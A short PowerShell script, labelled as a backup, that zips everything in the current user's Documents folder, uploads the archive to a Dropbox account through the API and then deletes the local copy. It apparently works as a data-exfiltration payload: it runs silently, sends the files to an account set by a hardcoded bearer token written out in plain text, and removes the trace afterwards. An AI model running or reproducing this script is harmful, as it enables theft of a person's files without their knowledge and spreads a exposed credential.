#Create Backup to be uploaded
Compress-Archive -Path $env:USERPROFILE\Documents\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip

#Variables
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "h1GwG5z6a0AAAAAAAAAAEGcdMuqVlXPHrU6urwoeiUtLovUSuiryOsHP3QzwXZb-"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"

#Does the Thing
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

#Clean Up
rm $SourceFilePath
